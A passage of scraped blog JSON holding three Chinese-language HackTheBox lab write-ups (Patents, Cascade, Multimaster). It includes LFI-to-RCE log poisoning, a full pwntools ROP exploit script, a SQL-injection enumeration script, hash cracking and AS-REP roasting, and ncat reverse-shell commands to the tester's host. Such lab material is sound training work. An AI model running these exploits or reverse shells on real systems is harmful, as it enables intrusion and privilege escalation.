+FollowSymLinks +MultiViews AllowOverride All Order deny,allow Allow from all &lt;&#x2F;Directory&gt; ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined&lt;&#x2F;VirtualHost&gt; /var/www/html/docx2pdf/config.php12345678&lt;?php# needed by convert.php$uploadir &#x3D; &#39;letsgo&#x2F;&#39;;# needed by getPatent.php# gbyolo: I moved getPatent.php to getPatent_alphav1.0.php because it&#39;s vulnerabledefine(&#39;PATENTS_DIR&#39;, &#39;&#x2F;patents&#x2F;&#39;);?&gt; 发现提示信息，getPatent_alphav1.0.php是存在漏洞的, 但无法直接读取这个文件的内容。 LFI to RCELFI直接去访问getPatent_alphav1.0.php,提示通过ID读取内容： 直接尝试目录遍历读取失败： 但使用两次../嵌套的话，成功，说明后端处理应该是简单的移除掉一次../： 所以这里也存在一个LFI log file同样，我们也可以读取log文件var/log/apache2/access.log ,注意会直接输出客户端信息例如UA,： 如果将UA修改为php代码，那么响应的log中就会直接显示执行后的结果(如果前面扫描产生的日志太多，建议reset一下机器)： reverse shell直接修改代码，反弹shell, 注意编码： 这个只是www-root用户，上传个pspy64收集信息： 123456curl http://10.10.14.106:7777/pspy64 -o pspy642020/05/18 08:11:01 CMD: UID=0 PID=853 | /usr/sbin/CRON -f2020/05/18 08:11:01 CMD: UID=0 PID=855 | /bin/sh -c env PASSWORD=\"!gby0l0r0ck\\$\\$!\" /opt/checker_client/run_file.sh2020/05/18 08:11:01 CMD: UID=0 PID=856 |2020/05/18 08:11:01 CMD: UID=0 PID=857 | python checker.py 10.100.0.1:8888 lfmserver_user PASSWORD /var/www/html/docx2pdf/convert.php 注意到env中直接有一个密码 1!gby0l0r0ck$$! 使用这个密码可以su切到root，但这个root并不是最终目标, 现在只是在docker里： user flag使用上面得到的root，可以在用户目录得到user.txt: checker_client前面也看到是cron运行的/opt/checker_client下的相关文件，我们检查下这些文件： run_file.sh12345678910111213141516171819202122232425262728293031cat run_file.sh#!/bin/bashecho $(date) &gt; /opt/checker_runnedFOLDER=/var/www/html/docx2pdfFILE=/var/www/html/docx2pdf/convert.php#export PASSWORD=\"!gby0l0r0ck\\$\\$!\"NEWFILE=$(python checker.py 10.100.0.1:8888 lfmserver_user PASSWORD $FILE)#echo \"Res: $NEWFILE\"#exitif [ -z $NEWFILE ]; then echo \"File not corrupted.\" exitfiif [ -f $NEWFILE ]; then echo \"File corrupted. Copying new file...\" cp $NEWFILE $FILE if [ $? -ne 0 ]; then echo \"Couldn't restore file\" else echo \"File restored successfully\" rm -f $NEWFILE fielse echo \"File not corrupted. Not doing anything\"fi 这个脚本检查/var/www/html/docx2pdf/convert.php的完整性，如果被修改，会进行还原。 checker.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192cat checker.py#!/usr/bin/env pythonimport sysimport osfrom utils import md5,recvlineimport socketINPUTREQ = \"CHECK /&#123;&#125; LFM\\r\\nUser=&#123;&#125;\\r\\nPassword=&#123;&#125;\\r\\n\\r\\n&#123;&#125;\\n\"if len(sys.argv) != 5: print \"Usage: \" + sys.argv[0] + \" &lt;host&gt;:&lt;port&gt; &lt;user&gt; &lt;pass&gt; &lt;file&gt;\" exit(-1)HOST = sys.argv[1]var = HOST.split(\":\")if len(var) != 2: print \"Usage: \" + sys.argv[0] + \" &lt;host&gt;:&lt;port&gt; &lt;user&gt; &lt;pass&gt; &lt;file&gt;\" exit(-1)try: PORT = int(var[1])except ValueError: print \"Port number must be integer\" exit(-1)HOST = var[0]#print \"Connecting to \" + HOST + \":\" + str(PORT)USER = sys.argv[2]try: PASS = os.environ[sys.argv[3]]except KeyError: print \"Couldn't find such password\" exit(-1)FILE = sys.argv[4]# At this point PASS is well-definedbase = os.path.basename(FILE)try: md5sum = md5(FILE)except IOError: print \"File not found locally\" exit(-1)REALREQ = INPUTREQ.format(base, USER, PASS, md5sum)s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((HOST, PORT))s.sendall(REALREQ)resp = s.recv(4096)s.close()#print respif \"LFM 200 OK\" in resp: #print \"File OK, no need to download\" exit(0)if \"404\" in resp: print \"File not found on server\" exit(-1)#print \"File corrupted, need to download it\"REQ = \"GET /&#123;&#125; LFM\\r\\n\\r\\n\".format(base)s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((HOST, PORT))s.sendall(REQ)recvline(s)recvline(s)recvline(s)resp = s.recv(8192)#if resp[-1] == '\\n':# resp = resp[:-1]##if resp[-1] == '\\r':# resp = resp[:-1]s.close()with open(\"&#123;&#125;.new\".format(base), \"wb\") as f: f.write(resp)print \"&#123;&#125;.new\".format(base) 其中的INPUTREQ类似HTTP请求格式，它计算convert.php的md5 hash，然后构造请求数据包，发送到10.100.0.1:8888，获取响应。200或者404响应脚本退出。如果发现文件损坏，则会GET请求下载新文件。 /usr/src/lfm存在一个lfm目录，应该是和前面的lfmserver相关，是一个git repo： 可以把整个目录下载下来分析 1234tar cvf &#x2F;var&#x2F;www&#x2F;html&#x2F;docx2pdf&#x2F;src.tar lfmwget http:&#x2F;&#x2F;10.10.10.173&#x2F;src.tartar xvf src.tarcd lfm lfmserver根据git log，回退到删除文件之前的版本，得到lfmserver的二进制文件，其他版本还能够得到源码： 1git reset --hard a900ccf7ae75b95db5f2d134d80e359a795e0cc6 逆向分析整个过程可以结合git得到的源码 IDA直接F5出错，换Ghidra，在Symbol Tree中找到entry()： FUN_004055c2 这个函数是libc_start_main()的第一个参数，即main()函数，点进去右键 edit the signature. 主要功能大概是检查参数数量，然后调用FUN_00404978检查参数，这里为了方便修改为check_args() Defined strings里也能发现之前在bash里看到的用户名密码： FUN_00403ad9Ctrl + Shift + F 查看密码的 references 可以看到有两次被作为函数参数使用，点击能够追踪到FUN_00403ad9函数，这个函数检查用户名和密码，检查通过会调用FUN_00402db9()： FUN_00402db9这个函数三个参数，第一个参数是请求路径，第二个是大小为128的缓冲区，最后一个参数是请求路径的长度： 这个函数在路径中循环查找%字符，找到后会使用strtoul()将字符转换成数字，转换后的字符串保存到buf，很明显这是URL解码，server会将URL编码的字符进行解码。 同样很明显，如果超出缓冲区长度，没有进行检查来停止转换，这意味着这里存在overflow，可能地利用点。 回到之前的FUN_00403ad9函数，注意这里会检查文件是否存在，文件不存在会直接返回，那么就不会调用溢出的指针，我们可以通过请求一个已知文件，例如convert.php，并在末尾附加一个空字节，这样字符串在空字节处终止，也能够通过文件检查。 Exploit Development常规的debug，leak addr，计算libc base，rop构造 注意点 url编码 sock_fd = 6 dup2将stdin，stdout，stderr复制到sock fd 详情查看参考资料，视频也很详细 我用的是这个里面的exp HTB: Patents | 0xdf hacks stuffhttps://0xdf.gitlab.io/2020/05/16/htb-patents.html#exploit root shellexp打到的shell很容易断，直接反弹shell后续操作： 这里因为python版本问题format输出不正常 但这个root shell没有root.txt： lsblk &amp; mountlsblk发现root是/dev/sdb，另外还有个/dev/sda： root flagsda2是根目录，我们可以挂载sda2，在mount后的目录中存在另一个root目录，得到root.txt: 使用的exp 注意libc版本，用的这个： https://launchpad.net/ubuntu/cosmic/amd64/libc6/2.28-0ubuntu1 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/env python3import urllib.parsefrom pwn import *if len(sys.argv) != 2 or sys.argv[1] not in ['local', 'remote']: print(\"Usage: &#123;sys.argv[0]&#125; [target]\\n target is local or remote\\n\") sys.exit(1)target = sys.argv[1]### Contextlfmserver = ELF('./lfmserver')if target == 'local': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False) ip = '127.0.0.1' port = 5000 one_gadget_offset = 0xc84daelse: #libc = ELF('/home/miao/Desktop/libc-database/db/libc6_2.28-0ubuntu1_amd64.so', checksec=False) libc = ELF(\"./libc-2.28.so\") ip = '10.10.10.173' port = 8888 one_gadget_offset = 0x501e3sock_fd = 6### Gadgets and payload templatepop_rdi = p64(0x0000000000405c4b)pop_rsi_r15 = p64(0x0000000000405c49)payload = \"CHECK /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd%xx\" + \"a\" * 125 + \"&#123;&#125; LFM\\r\\nUser=lfmserver_user\\r\\nPassword=!gby0l0r0ck$$!\\r\\n\\r\\n\"### Stage 1: libc leakrop = pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(lfmserver.got['socket']) + p64(0) + p64(lfmserver.plt['write'])p = remote(ip, port)p.sendline(payload.format(urllib.parse.quote(rop)))data = p.recvall()socket_addr = u64(data.split(b'\\n')[1][:8].ljust(8, b\"\\x00\"))log.info(\"Found socket address: 0x&#123;socket_addr:016x&#125;\")libc_base_addr = socket_addr - libc.symbols['socket']log.info(\"Calculated libc base address: 0x&#123;libc_base_addr:016x&#125;\")one_gadget_addr = libc_base_addr + one_gadget_offsetlog.info(\"Calculated one gadget address: 0x&#123;one_gadget_addr:016x&#125;\")print()### Stage 2: Shellp = remote(ip, port)rop = pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(0) + p64(0) + p64(lfmserver.plt['dup2'])rop += pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(1) + p64(0) + p64(lfmserver.plt['dup2'])rop += pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(2) + p64(0) + p64(lfmserver.plt['dup2'])rop += p64(one_gadget_addr)log.info(\"Sending stage two rop\")p.sendline(payload.format(urllib.parse.quote(rop)))p.recv(22)p.interactive() 参考资料 https://file-examples.com/index.php/sample-documents-download/sample-doc-download/ https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-words.txt https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-with-dtd-and-php-filter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE Injection#xxe-oob-with-dtd-and-php-filter) Hack The Box - Patents Writeup | Chr0x6eOshttps://chr0x6eos.github.io/2020/05/16/htb-Patents.html HTB: Patents | 0xdf hacks stuffhttps://0xdf.gitlab.io/2020/05/16/htb-patents.html#exploit HackTheBox - Patents - YouTubehttps://www.youtube.com/watch?v=XqsURG_agvY","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Cascade - HackTheBox","slug":"Cascade-HackTheBox","date":"2020-05-17T08:35:46.000Z","updated":"2020-07-27T00:51:57.818Z","comments":true,"path":"2020/05/17/Cascade-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/05/17/Cascade-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/235 10.10.10.182 端口扫描windows服务器，没有web，开了域相关端口 135RPC可以匿名访问，直接用rpcclient 1234567891011121314151617181920212223242526272829rpcclient 10.10.10.182 -U \"\"Enter WORKGROUP\\'s password:rpcclient $&gt; enumdomusersuser:[CascGuest] rid:[0x1f5]user:[arksvc] rid:[0x452]user:[s.smith] rid:[0x453]user:[r.thompson] rid:[0x455]user:[util] rid:[0x457]user:[j.wakefield] rid:[0x45c]user:[s.hickson] rid:[0x461]user:[j.goodhand] rid:[0x462]user:[a.turnbull] rid:[0x464]user:[e.crowe] rid:[0x467]user:[b.hanson] rid:[0x468]user:[d.burman] rid:[0x469]user:[BackupSvc] rid:[0x46a]user:[j.allen] rid:[0x46e]user:[i.croft] rid:[0x46f]rpcclient $&gt; enumdomgroupsgroup:[Enterprise Read-only Domain Controllers] rid:[0x1f2]group:[Domain Users] rid:[0x201]group:[Domain Guests] rid:[0x202]group:[Domain Computers] rid:[0x203]group:[Group Policy Creator Owners] rid:[0x208]group:[DnsUpdateProxy] rid:[0x44f]rpcclient $&gt; enumdomainsname:[CASCADE] idx:[0x0]name:[Builtin] idx:[0x0]rpcclient $&gt; enum enum enum之后就是各种enum： 1cat raw.txt | while read line; do echo $line | cut -d' ' -f2 | cut -d':' -f2 | cut -d'[' -f2 | cut -d']' -f1;done &gt; user.txt 1cat user.txt | while read line; do rpcclient -U \"\" --no-pass -c=\"queryuser $line\" 10.10.10.182;sleep 1;done &gt; userinfo.txt 1cat raw.txt | while read line; do echo $line | cut -d' ' -f1 | cut -d':' -f2 | cut -d'[' -f2 | cut -d']' -f1;done &gt; user_name.txt 现在只有一些用户信息 389389是ldap 1ldapsearch -h 10.10.10.182 -p 389 -x -b \"dc=cascade,dc=local\" &gt; ldap_info.txt 结果中信息非常多，仔细搜寻 123456cn: Ryan Thompsonsn: ThompsongivenName: RyandistinguishedName: CN&#x3D;Ryan Thompson,OU&#x3D;Users,OU&#x3D;UK,DC&#x3D;cascade,DC&#x3D;localcascadeLegacyPwd: clk0bjVldmE&#x3D; # base64 decode : rY4n5eva 现在我们得到一组账号密码： 1r.thompson : rY4n5eva smbclient这个账号直接使用evil-winrm失败，smbclient可以使用： Data\\IT下载IT目录： 这个文件有部分信息： 这个log中有一个密码信息： 这个密码如果直接按hex解的话是错的，直接搜索”VNC Install.reg password”能够找到相关资料： https://github.com/frizb/PasswordDecrypts 1234567&gt;&gt; fixedkey = \"\\x17\\x52\\x6b\\x06\\x23\\x4e\\x58\\x07\"=&gt; \"\\u0017Rk\\u0006#NX\\a\"&gt;&gt; require 'rex/proto/rfb'=&gt; true&gt;&gt; Rex::Proto::RFB::Cipher.decrypt [\"6BCF2A4B6E5ACA0F\"].pack('H*'), fixedkey=&gt; \"sT333ve2\"&gt;&gt; 又一组账号密码： 1s.smith ： sT333ve2 NETLOGONNETLOGON中有两个vbs文件： SYSVOL把这个目录下载下来，因为Groups.xml中可能存在用户名和密码(GPP): user flag 上一步我们已经得到了s.smith的账号密码，使用这个账号登录，得到user.txt: 1s.smith ： sT333ve2 enum more使用s.smith账号继续进行信息搜集： Audit$\\DB这个目录下有一个db文件，下载下来查看，是sqlite3: 12345678910111213141516➜ ~ sqlite3 Audit.dbSQLite version 3.31.1 2020-01-27 19:55:54Enter \".help\" for usage hints.sqlite&gt; .tablesDeletedUserAudit Ldap Miscsqlite&gt; select * from DeletedUserAudit;6|test|TestDEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local7|deleted|deleted guyDEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local9|TempAdmin|TempAdminDEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=localsqlite&gt; select * from Ldap;1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.localsqlite&gt; select * from misc;sqlite&gt; ldap中得到信息，但直接base64解的话是乱码，直接搜这串base64能够搜到相关信息： https://dotnetfiddle.net/2RDoWz 所以现在我们有了一组新的账号密码： 1ArkSvc ： w3lc0meFr31nd IT\\Logs\\Ark AD Recycle BinArkAdRecycleBin.log中存在相关信息，可以看到之前看到的TempAdmin是被ArkSvc用户删除的: AD Object搜索上面显示的Ark AD Recycle Bin Manager能够找到相关资料： Active Directory Recycle Bin | Recover Deleted AD Object | AD Deleted Objectshttps://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/ 1Get-ADOptionalFeature -Filter * 1Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN&#x3D;*)&quot; –IncludeDeletedObjects 1Get-ADObject -Filter &#123;DisplayName -like &#39;TempAdmin&#39;&#125; -IncludeDeletedObjects | Restore-ADObject 直接尝试恢复的话，失败： 修改过滤条件继续搜寻信息： 123456$changeDate &#x3D; New-Object dateTime(2008,11,18,1,40,02)Get-ADObject -Filter &#39;whenChanged -gt $changeDate -and isDeleted -eq $true -and -not (isRecycled -eq $true) -and name -ne &quot;Deleted Objects&quot;&#39; -IncludeDeletedObjectsGet-ADObject -Filter &#123;displayName -eq &quot;TempAdmin&quot;&#125; -IncludeDeletedObjects -Properties *cascadeLegacyPwd YmFDVDNyMWFOMDBkbGVz base64解码后是TempAdmin的密码 1baCT3r1aN00dles root flag 根据前面的邮件，TempAdmin的密码和Administrator密码相同，直接登录，得到root.txt: 参考资料 https://github.com/frizb/PasswordDecrypts https://dotnetfiddle.net/2RDoWz Active Directory Recycle Bin | Recover Deleted AD Object | AD Deleted Objectshttps://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/ 域信息枚举 - 先知社区https://xz.aliyun.com/t/7724 域控提权合集 - 先知社区https://xz.aliyun.com/t/7726#toc-18 Active Directory Basics For CTF Players - YouTubehttps://www.youtube.com/watch?v=g_l_vKYyb5E 0x0D-HackTheBox-Cascade_ldap_VIA-SEC-CSDN博客https://blog.csdn.net/heisejiuhuche/article/details/105946755","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Multimaster - HackTheBox","slug":"Multimaster-HackTheBox","date":"2020-05-06T08:20:17.000Z","updated":"2020-09-21T00:32:17.492Z","comments":true,"path":"2020/05/06/Multimaster-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/05/06/Multimaster-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/232 10.10.10.179 端口扫描windows服务器，开了域相关端口，但enum4linux没什么有用信息 80 有一个搜索接口，发送空可以得到所有员工信息： WAF bypass尝试sql注入，存在WAF，注意unicode编码后可以bypass： sqlmap存在charunicodeencode tamper,简单修改下就可以用于这种情况： 123456789diff charunicodeencode.py /usr/local/Cellar/sqlmap/1.4.4/libexec/tamper/charunicodeencode.py48c48&lt; retVal += \"\\\\u00%s\" % payload[i + 1:i + 3]---&gt; retVal += \"%%u00%s\" % payload[i + 1:i + 3]51c51&lt; retVal += '\\\\u%.4X' % ord(payload[i])---&gt; retVal += '%%u%.4X' % ord(payload[i]) SQL注入因为有WAF，需要delay，这部分很耗时间： 1234567891011121314151617181920212223242526272829303132333435363738394041424344sqlmap -r sql.txt -v 3 --tamper charunicodeencode2 -delay 3[INFO] the back-end DBMS is Microsoft SQL Serversqlmap -r sql.txt -v 3 --tamper charunicodeencode2 -delay 3 --dbsavailable databases [5]:[*] Hub_DB[*] master[*] model[*] msdb[*] tempdbsqlmap -r sql.txt -v 3 --tamper charunicodeencode2 -delay 3 -D Hub_DB --tablesDatabase: Hub_DB[2 tables]+------------+| Colleagues || Logins |+------------+sqlmap -r sql.txt -v 3 --tamper charunicodeencode2 -delay 3 -D Hub_DB -T Logins --dumpDatabase: Hub_DBTable: Logins[17 entries]+------+----------+--------------------------------------------------------------------------------------------------+| id | username | password |+------+----------+--------------------------------------------------------------------------------------------------+| 1 | sbauer | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 || 2 | okent | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa || 3 | ckane | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 || 4 | kpage | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 || 5 | shayna | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 || 6 | james | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 || 7 | cyork | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 || 8 | rmartin | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa || 9 | zac | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 || 10 | jorden | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 || 11 | alyx | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa || 12 | ilee | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 || 13 | nbourne | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa || 14 | zpowers | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 || 15 | aldom | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 || 16 | minatotw | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc || 17 | egre55 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc |+------+----------+--------------------------------------------------------------------------------------------------+ hash crack去重后得到4个hash： 12349777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc 是某种384算法，尝试可以确认是Keccak-384： 12345hashcat -m 17900 -a 0 -n 10 hashes.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --force9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password168d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1 得到三个密码： 123password1finance1banking1 但已有的用户名无法使用这些密码登录 注入获取AD数据现在我们有注入，sqlserver数据库，搜索资料能够发现，可以通过注入获取AD数据，详见参考资料: 获取SID注入语句： 1-&#39; union select 1,2,3,4,(select (select stuff(upper(sys.fn_varbintohexstr((SELECT SUSER_SID(&#39;MEGACORP\\Domain Admins&#39;)))), 1, 2, &#39;&#39;)))--- 转换成unicode，注意选项： https://www.branah.com/unicode-converter 10105000000000005150000001C00D1BCD181F1492BDFC23600020000 注入脚本 使用上面得到的SID，利用脚本获取数据，注意SID去掉后面几位，因为脚本是拼接遍历： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#!/usr/bin/env pythonimport requestsimport reimport jsonimport timefrom termcolor import coloreddef little(s): try: t = bytearray.fromhex(s) t.reverse() return \"\".join(format(x,\"02x\") for x in t).upper() except: print colored(\"[i] Finished, Domain Accounts are over\", \"blue\") exit(0)if __name__ == \"__main__\": i = 1100 SID = \"0x0105000000000005150000001C00D1BCD181F1492BDFC236\" #SID = raw_input(\"Enter SID: \") URL = \"http://10.10.10.179/api/getColleagues\" #URL = raw_input(\"Enter URL:\") print colored(\"\\n\\t+----------------------------------------------------------------------+\", \"magenta\") print colored(\"\\t| |\", \"magenta\") print colored(\"\\t| Enumerating Script For Domain Accounts by M0NET |\", \"magenta\") print colored(\"\\t| SID: \" + SID + \" |\", \"magenta\") print colored(\"\\t| |\", \"magenta\") print colored(\"\\t+----------------------------------------------------------------------+\\n\\n\", \"magenta\") for x in range(1100,6100,1000): for i in range(15): JUNK = \"0\" + hex((x + i))[2:].upper() RID = SID + little(JUNK) + 4 * \"0\" payload = \"-' union select 1,2,3,4,SUSER_SNAME(&#123;&#125;)-- -\".format(RID) #payload = raw_input(\"Enter Payload: \") pattern = re.compile(r\"([0-9a-f]&#123;2&#125;)\") encpyload = pattern.sub(r\"\\\\u00\\1\", payload.encode(\"hex\")) r = requests.post(URL, data='&#123;\"name\": \"' + encpyload + '\"&#125;', headers = &#123;\"Content-Type\":\"application/json;charset=utf-8\"&#125;) if \"403 - Forbidden: Access is denied.\" in r.text: print colored(\"[-] Sleeping until WAF cooldown\", \"red\") time.sleep(10) continue if \"\\\\\" in r.text: print colored(\"[i] Counter: \" + format((x + i)), \"blue\") print colored(\"[+] RID: \" + format(RID), \"green\") print colored(\"[+] Pyload: \" + payload, \"green\") #print colored(\"[+] Encoded payload: \" + format(encpayload), \"green\") print colored(\"\\n\" + r.text, \"yellow\") jsona = json.loads(r.text) if jsona: try: for element in jsona: del element[u\"position\"] del element[u\"id\"] del element[u\"email\"] del element[u\"name\"] except TypeError: del jsona[u\"position\"] del jsona[u\"id\"] del jsona[u\"email\"] del jsona[u\"name\"] data = json.dumps(jsona, sort_keys=True, indent=4) if \"\\\\\" in r.text: print colored(data + \"\\n\", \"yellow\") i += 1 域账号服务列表使用上述脚本，得到域账号服务列表： 1234567891011121314151617181920212223Users:MEGACORP\\\\jamesMEGACORP\\\\daiMEGACORP\\\\tushikikatomoMEGACORP\\\\zacMEGACORP\\\\lanaMEGACORP\\\\andrewMEGACORP\\\\jordenMEGACORP\\\\alyxMEGACORP\\\\Privileged IT AccountsMEGACORP\\\\cyorkMEGACORP\\\\rmartinServices:MEGACORP\\\\DnsAdminsMEGACORP\\\\DnsUpdateProxyMEGACORP\\\\svc-nasMEGACORP\\\\svc-sqlMEGACORP\\\\ckaneMEGACORP\\\\kpageMEGACORP\\\\ileeMEGACORP\\\\nbourneMEGACORP\\\\zpowers smb_login使用前面得到的用户名和密码字典枚举smb，得到一组有效账号密码： 1tushikikatomo : finance1 user flag使用这个账号密码登录，在桌面得到user.txt: 收集信息特权用户12345678910111213whoami &#x2F;all# 当前用户基本没什么权限Get-ADUser -Filter * -SearchBase &quot;DC&#x3D;MEGACORP,DC&#x3D;LOCAL&quot;Get-ADgroup -Filter *Get-ADPrincipalGroupMembership jorden | Select-Object NameName----Domain UsersRemote Management UsersServer OperatorsDevelopers 注意jorden用户在Developers和Server Operators组中，这个用户应该具有某些特权 VSCode LCE使用Get-Process能够发现很多Code进程，这是Visual Studio Code VSCode有一个历史漏洞CVE-2019-1414，Local Command Execution cefdebug我们可以用cefdebug找到调试端口然后执行代码反弹shell 123.&#x2F;cefdebug.exe.&#x2F;cefdebug.exe --url ws:&#x2F;&#x2F;127.0.0.1:15836&#x2F;115bfde7-b2cc-49ff-a271-c5b844070216 --code &quot;process.mainModule.require(&#39;child_process&#39;).exec(&#39;cmd.exe &#x2F;c C:&#x2F;temp&#x2F;ncat.exe 10.10.14.109 6666 -e cmd.exe&#39;)&quot; 得到的是cyork用户 敏感文件在C:\\inetpub\\wwwroot\\bin&gt;目录有两个文件，MultimasterAPI.dll和MultimasterAPI.pdb，下载这两个文件后能够在其中发现一个密码： 1MASTER7&#123; &quot;info&quot; : &quot;MegaCorp API&quot; &#125;!application&#x2F;json server&#x3D;localhost;database&#x3D;Hub_DB;uid&#x3D;finder;password&#x3D;D3veL0pM3nT!; 但使用这个密码登录finder失败，密码是由development变形而来，想到需要前面得到的Developers用户组中的用户 Developers1Get-ADGroupMember -Identity Developers 使用得到的用户尝试，成功登录sbauer, 但这个用户也没什么特权： Kerberoasting注意到这句信息 1Kerberos support for Dynamic Access Control on this device has been disabled. 使用了Kerberos，但没有设置DONT_REQ_PREAUTH的单个账号，我们的目标是jorden用户，尝试手动设置，成功： 1Set-ADAccountControl -Identity jorden -doesnotrequirepreauth $true 之后使用 GetNPUsers.py获取TGT： 123sudo python3 GetNPUsers.py MEGACORP.local&#x2F;sbauer:D3veL0pM3nT! -dc-ip 10.10.10.179 -request$krb5asrep$23$jorden@MEGACORP.LOCAL:cb7716edef8e72686a4023195ee2b0d8$6885a7f1d49042a8a5dca1124b266811109adae0adeb85c1d46f04ae43e9ab21744018dd84c0f628b3bd7aa4c7045d0b644af52ee87ef0177f3cc13f7c1e498e47253e789af0d106c329a3bfcb3901f99d4513d156be88423e90804c606951e84591f90852db4f110c866e7386750e44dc3ee0fb57fead301944056299104e8f642e37bb7d943978bf197b0f8d05308b40cfee11f7b85d379312e131ed9b7e5408c8c172b10b62b27f4597a00a1dd5e7abff8ac0f1e4d7c8d823c589b457388b956a7fc4c467eca087ede5dd92afbbd08023cec022907ddaae4677e77244c22cbbb1188d0054d93a27e482289ad5feb4 直接使用hashcat破解： 123hashcat -m 18200 -D 1 -a 0 -n 10 hash.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --forcerainforest786 jorden使用这个密码登录jorden： 使用winPEAS我们可以发现这个用户可以控制系统服务： 提权那么我们可以随意修改一个服务的imagepath，重启服务，反弹system权限的shell： 12REG add HKLM\\System\\CurrentControlSet\\Services\\SensorDataService &#x2F;v ImagePath &#x2F;t REG_EXPAND_SZ &#x2F;d &quot;cmd.exe &#x2F;c C:\\temp\\ncat.exe 10.10.14.109 8888 -e cmd.exe&quot; &#x2F;fsc.exe start SensorDataService root flag在Administrator用户桌面得到root.txt: 参考资料 Querying Active Directory Data from SQL Serverhttps://www.mssqltips.com/sqlservertip/2580/querying-active-directory-data-from-sql-server/ Get Active Directory Users and Groups with SQL Server Integration 